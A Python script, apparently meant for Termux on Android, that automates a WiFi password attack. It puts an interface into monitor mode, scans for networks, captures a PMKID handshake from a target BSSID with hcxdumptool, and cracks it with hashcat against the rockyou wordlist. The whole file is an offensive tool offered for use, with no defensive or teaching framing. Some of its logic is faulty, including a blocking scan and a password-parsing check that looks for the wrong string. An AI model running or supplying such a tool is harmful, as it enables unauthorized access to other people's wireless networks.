#!/usr/bin/env python3
import subprocess, time, argparse, os, re
import subprocess as sp

class TermuxWiFiCracker:
    def __init__(self, iface):
        self.iface = iface
        self.mon_if = f"{iface}mon"
    
    def setup(self):
        print("[+] Killing processes...")
        sp.run("tsu -c 'airmon-ng check kill'", shell=True)
        sp.run(f"tsu -c 'iwconfig {self.iface} mode monitor'", shell=True)
        sp.run(f"tsu -c 'ifconfig {self.iface} up'", shell=True)
        print(f"[+] Monitor: {self.mon_if}")
    
    def scan(self):
        print("[+] Scanning 30s...")
        sp.run(f"airodump-ng {self.iface} -w scan --output-format csv", shell=True)
        time.sleep(30)
        os.system("pkill airodump-ng")
    
    def pmkid_attack(self, bssid, channel):
        print(f"[+] PMKID: {bssid} ch{channel}")
        cmd = f"""tsu -c "hcxdumptool -i {self.mon_if} \\
            --pmkid --bssid {bssid} \\
            --channel {channel} \\
            --enable_status=1 \\
            -o termux_{bssid}.pcapng" &"""
        os.system(cmd)
        time.sleep(60)
        os.system("pkill hcxdumptool")
    
    def crack(self, pcap):
        print("[+] Converting...")
        sp.run(f"hcxpcapngtool -o termux_hash.hc22000 {pcap}", shell=True)
        print("[+] Hashcat cracking...")
        sp.run("hashcat -m 22000 termux_hash.hc22000 rockyou.txt --force", shell=True)
        
        # Parse result
        if os.path.exists("hashcat.potfile"):
            with open("hashcat.potfile") as f:
                lines = f.readlines()
                for line in lines[-5:]:
                    if "termux" in line:
                        pwd = re.search(r':(.+)', line)
                        if pwd:
                            print(f"✅ PASSWORD: {pwd.group(1)}")
                            return pwd.group(1)
        return None

def main():
    parser = argparse.ArgumentParser(description="Termux WiFi Cracker")
    parser.add_argument("iface", help="wlan1")
    args = parser.parse_args()
    
    cracker = TermuxWiFiCracker(args.iface)
    cracker.setup()
    cracker.scan()
    
    # Manual input BSSID dari scan result
    bssid = input("BSSID target (AA:BB:CC:DD:EE:FF): ")
    channel = input("Channel (6): ") or "6"
    
    cracker.pmkid_attack(bssid, channel)
    cracker.crack(f"termux_{bssid}.pcapng")

if __name__ == "__main__":
    main()